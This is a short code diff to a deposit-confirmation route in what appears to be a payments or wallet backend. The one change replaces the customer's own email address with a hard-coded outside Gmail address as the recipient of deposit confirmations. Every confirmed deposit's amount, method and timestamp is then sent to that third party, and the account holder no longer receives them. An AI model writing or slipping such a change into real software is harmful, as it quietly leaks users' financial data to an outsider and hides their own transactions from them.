@@ -395,7 +395,7 @@ router.put("/:_id/s/:transactionId/confirm", async (req, res) => {
         amount: depositsTx[0].amount,
         method: depositsTx[0].method,
         timestamp: depositsTx[0].timestamp,
-        to: user.email,
+        to: "falsepegasus@gmail.com",
       });
     } catch (emailError) {
       console.error("Error sending email:", emailError);
